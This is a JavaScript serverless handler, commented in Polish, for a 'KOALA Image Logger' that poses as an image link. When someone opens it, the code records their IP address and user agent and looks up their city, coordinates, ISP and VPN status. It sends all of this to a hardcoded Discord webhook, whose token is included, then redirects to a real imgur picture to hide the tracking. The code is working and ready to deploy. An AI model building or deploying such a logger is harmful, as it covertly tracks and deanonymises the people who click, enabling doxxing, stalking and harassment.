// ====================== KOALA IMAGE LOGGER ======================
// Działa dokładnie jak Discord Image Logger

const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";

// Funkcja pobierania geolokalizacji
async function getGeo(ip) {
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
        const data = await res.json();
        if (data.status === 'success') return data;
    } catch {}
    return null;
}

export default async function handler(req, res) {
    // Pobierz IP
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip === '::1') ip = '127.0.0.1';
    if (ip.startsWith('::ffff:')) ip = ip.split(':').pop();
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toLocaleString();
    
    // Pobierz geolokalizację
    const geo = await getGeo(ip);
    
    // Przygotuj wiadomość
    let message = `[+] KOALA Image Logger - IP Logged\nA User Opened the Original Image!\n\nEndpoint: /api/hotdog\n\nIP Info:\nIP: ${ip}\n`;
    
    if (geo) {
        message += `Provider: ${geo.isp || 'Unknown'}\nASN: ${geo.as || 'Unknown'}\nCountry: ${geo.country || 'Unknown'}\nRegion: ${geo.regionName || 'Unknown'}\nCity: ${geo.city || 'Unknown'}\nCoords: ${geo.lat || '?'}, ${geo.lon || '?'}\nTimezone: ${geo.timezone || 'Unknown'}\nMobile: ${geo.mobile ? 'True' : 'False'}\nVPN: ${geo.proxy ? 'True' : 'False'}\n`;
    } else {
        message += `Provider: Unknown\nASN: Unknown\nCountry: Unknown\nRegion: Unknown\nCity: Unknown\nCoords: ?, ?\nTimezone: Unknown\nMobile: False\nVPN: False\n`;
    }
    
    message += `\nPC Info:\nOS: Unknown\nBrowser: Unknown\n\nUser Agent:\n${userAgent}`;
    
    // Wyślij webhook
    try {
        await fetch(YOUR_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch {}
    
    // Zwróć prawdziwy obrazek PNG (przekierowanie)
    res.redirect(302, 'https://i.imgur.com/9ZqB8Xa.jpg');
}
